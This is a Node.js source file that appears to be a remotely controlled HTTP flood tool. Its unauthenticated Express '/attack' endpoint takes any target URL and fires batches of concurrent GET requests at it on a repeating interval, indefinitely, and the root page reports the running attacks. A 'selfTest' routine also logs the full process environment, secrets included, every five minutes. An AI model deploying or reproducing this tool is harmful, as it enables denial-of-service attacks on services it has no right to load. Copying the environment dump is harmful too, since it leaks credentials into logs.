'use strict';

import express from "express";
import got from 'got';




function Stress() { 
    this.stats = {
        errors: 0,
        success: 0,
        loop: 0
    };
}

Stress.prototype.run = function(url, concurent, intervalTime) {
    this.target = url;
    const attack = () => {
        for(var i = 0; i < concurent; i += 1) {
            got.get(url, {timeout: {
                request: 3000
            }})
                .then(res => res.statusCode >= 200 && res.statusCode < 300 ? this.stats.success += 1 : this.stats.errors += 1)
                .catch(() => this.stats.errors += 1);
        }
        this.stats.loop += 1;

        console.log("Target: "+this.target+" Loop: "+this.stats.loop+" Current stats: errors("+this.stats.errors+") success("+this.stats.success+")");
    };

    setInterval(attack, intervalTime);
}

Stress.prototype.resetStats = function () {
    this.stats = {
        errors: 0,
        success: 0,
        loop: 0
    };
}


// Constants
const PORT = process.env.PORT || 8080;

const instances = [];

// App
const app = express();
app.get('/', (req, res) => {
  const response = instances.map(x => "Target: "+x.target+" Loop: "+x.stats.loop+" Current stats: errors("+x.stats.errors+") success("+x.stats.success+")").join('<br />');
  res.send("Status:<br />" + response);
});

app.get('/attack', (req, res) => {
    if(!req.query.target) {
        res.sendStatus(400);
        return;
    }

    const stress = new Stress();
    instances.push(stress);
    const conncurrency = req.query.c ? parseInt(req.query.c) : 100;
    const timeout = req.query.t ? parseInt(req.query.t) : 1000;
    stress.run(req.query.target, conncurrency, timeout);
    res.send('Attack '+req.query.target+" Amount of requests: "+conncurrency+ " Interval: "+timeout+"ms");
});

app.listen(PORT);
console.log(`Running on ${PORT} port`);

const selfTest = () => {
    const url = process.env.URL;
    if(!url) return;

    got.get(url)
        .then(function() {
            console.log(`selftest OK.  ${JSON.stringify(process.env)}`);
        })
        .catch(function() {
            console.error('selftest error');
        });
};

selfTest();
setInterval(selfTest, 300000);

